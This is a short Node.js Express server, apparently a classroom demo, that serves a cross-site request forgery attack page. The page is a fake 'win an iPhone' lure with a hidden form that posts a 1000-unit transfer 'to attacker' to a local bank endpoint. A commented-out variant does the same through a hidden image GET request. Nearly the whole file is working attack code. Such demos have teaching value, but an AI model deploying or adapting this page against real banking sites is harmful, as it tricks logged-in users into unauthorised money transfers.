const express = require('express');
const bodyParser = require('body-parser');

const app = express();

app.get('/makePayment', (req, res) => {
  res.send('Payment Done');
});

app.get('/', (req, res) => {
  //   const html = `
  // <!DOCTYPE html>
  // <html>
  // <head>
  //     <title>Attack Page</title>
  // </head>
  // <body>
  //     <h1>Click anywhere to win a prize!</h1>
  //     <img src="http://localhost:5001/transfer?to=attacker&amount=100" style="display:none;" />
  // </body>
  // </html>
  //   `;

  const html = `
<!DOCTYPE html>
<html>
<head>
    <title>Bank Payment Page Page</title>
</head>
<body>
    <h1>You have wont price click the button to get Iphone</h1>
    <form action="http://localhost:5005/transfer" method="POST">
   <div style="display: none">
       <input id="to" name='to' value="attacker"/>
    <input id="amount"  name="amount" value="1000"/>
   </div>

    <button type="submit">click here to get iphone</button>
    </form>
</body>
</html>`;

  res.send(html);
});
app.listen(3001, () => console.log('Mallicous Server started at 3001'));
